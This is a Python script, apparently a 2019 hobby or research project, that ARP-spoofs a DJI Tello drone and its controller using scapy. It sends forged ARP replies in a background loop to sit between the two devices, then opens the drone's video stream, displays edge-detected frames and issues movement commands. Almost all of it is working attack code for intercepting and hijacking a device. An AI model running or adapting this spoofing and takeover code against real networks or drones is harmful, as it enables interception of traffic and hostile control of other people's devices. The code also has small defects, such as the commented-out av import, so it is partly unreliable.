# Writer: Gal Harari
# Date: 29/05/2019$
from TelloPy.tellopy._internal import tello
# import av
import cv2
import numpy
import time
import traceback
from scapy.all import *
import signal
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP, Ether

handler_ip = '192.168.10.2'
handler_mac = 'ec:d0:9f:fd:1b:25'
drone_ip = '192.168.10.1'
drone_mac = '60:60:1f:c4:3d:ba'
my_mac = '00:26:bb:18:b8:e5'


def spoof_on_background():
    bcast_base = Ether(dst='ff:ff:ff:ff:ff:ff')
    # print(get_mac(handler_ip))
    drone_base = Ether(dst=drone_mac)
    handler_base = Ether(dst=handler_mac, src=my_mac)

    spoof_drone_pkt = drone_base / ARP(op=2, hwdst=drone_mac, pdst=drone_ip,
                                       psrc=handler_ip)
    spoof_handler_pkt = handler_base / ARP(op=2, hwdst=handler_mac, pdst=handler_ip,
                                           psrc=drone_ip)
    _spoof_drone_pkt = bcast_base / ARP(op=2, pdst=handler_ip, psrc=handler_ip)
    _spoof_handler_pkt = bcast_base / ARP(op=2, pdst=drone_ip, psrc=drone_ip)

    while True:
        print("Sending ARP...")
        sendp(spoof_handler_pkt, iface='en1')
        sendp(spoof_drone_pkt, iface='en1')
        # sniff_filter = f"ip host {handler_ip}"

        time.sleep(0.05)


def spoof():
    spoofing_thread = Thread(target=spoof_on_background)
    spoofing_thread.start()


def main():
    drone = tello.Tello()

    try:
        spoof()
        time.sleep(3)

        drone.connected.set()

        retry = 3
        container = None
        while container is None and 0 < retry:
            retry -= 1
            try:
                container = av.open(drone.get_video_stream())
            except av.AVError as ave:
                print(ave)
                print('retry...')

        # skip first 300 frames
        frame_skip = 300
        while True:
            for frame in container.decode(video=0):
                if 0 < frame_skip:
                    frame_skip = frame_skip - 1
                    continue
                start_time = time.time()
                image = cv2.cvtColor(numpy.array(frame.to_image()), cv2.COLOR_RGB2BGR)
                cv2.imshow('Original', image)
                cv2.imshow('Canny', cv2.Canny(image, 100, 200))
                cv2.waitKey(1)
                if frame.time_base < 1.0 / 60:
                    time_base = 1.0 / 60
                else:
                    time_base = frame.time_base
                frame_skip = int((time.time() - start_time) / time_base)
                drone.right(20)
    except Exception as ex:
        exc_type, exc_value, exc_traceback = sys.exc_info()
        traceback.print_exception(exc_type, exc_value, exc_traceback)
        print(ex)
    finally:
        drone.quit()
        cv2.destroyAllWindows()


if __name__ == "__main__":
    main()
